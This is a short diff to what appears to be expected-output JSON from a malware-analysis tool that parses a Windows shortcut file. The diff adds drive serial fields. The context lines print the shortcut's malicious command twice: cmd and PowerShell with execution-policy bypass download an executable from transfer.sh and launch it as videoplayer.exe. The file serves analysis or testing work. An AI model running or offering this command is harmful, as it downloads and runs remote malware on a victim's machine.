@@ -116,6 +116,9 @@
               "command_line": [
                 "C:\\Windows\\System32\\cmd.exe /c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe"
               ],
+              "drive_serial": [
+                "C4CEB1F5"
+              ],
               "icon_location": [
                 "%windir%\\system32\\imageres.dll"
               ],
@@ -234,6 +237,13 @@
           "heur_id": null,
           "signatures": [],
           "value": "C:\\Windows\\System32\\cmd.exe /c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe"
+        }
+      ],
+      "file.shortcut.drive_serial": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "C4CEB1F5"
         }
       ],
       "file.shortcut.icon_location": [
